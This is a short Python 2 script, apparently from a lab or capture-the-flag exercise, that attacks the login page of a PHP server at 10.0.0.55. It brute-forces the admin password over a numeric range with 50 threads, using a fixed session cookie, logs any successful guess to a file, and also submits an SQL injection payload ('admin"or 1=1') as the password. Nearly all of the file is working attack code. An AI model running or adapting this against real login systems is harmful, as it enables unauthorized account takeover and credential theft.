# coding: utf-8
import urllib, urllib2
import md5
import datetime
import Queue
import threading

passwords = [number for number in range(750000, 800000)]
queue = Queue.Queue()

def log_in(username, pswd, checkid):
    pswd = str(pswd)
    a = md5.new(pswd)
    password = a.hexdigest()
    #print username, pswd, checkid
    
    password = 'admin"or 1=1'
    opener = urllib2.build_opener()
    opener.addheaders.append(('Cookie', "PHPSESSID=b168a50cbd626d1bedfef223fb2592d3"))
    formdata = {"action":"login", "uname": username, "pass": password, "checkid": checkid}
    data_encoded = urllib.urlencode(formdata)
    response = opener.open("http://10.0.0.55:8081/login.php", data_encoded)
    content = response.read()
    print content.decode("gbk")
    if content.decode("gbk").encode("utf-8") != "用户名或密码错误":
        f = open("password.txt", "a")
        f.write(pswd)
        f.close()
        print "密码就是：" + pswd
    

class ThreadUrl(threading.Thread):
    def __init__(self, queue):
        threading.Thread.__init__(self)
        self.queue = queue
 
    def run(self):
        while True:
            pswd = self.queue.get()
            log_in("admin", pswd, "8844")


def main():
    for i in range(50):
        t = ThreadUrl(queue)
        t.setDaemon(True)
        t.start()
              
        for pswd in passwords:
            queue.put(pswd)
           
    queue.join()
if __name__ == "__main__":
    #main()
    log_in("admin", "admin", "4197")
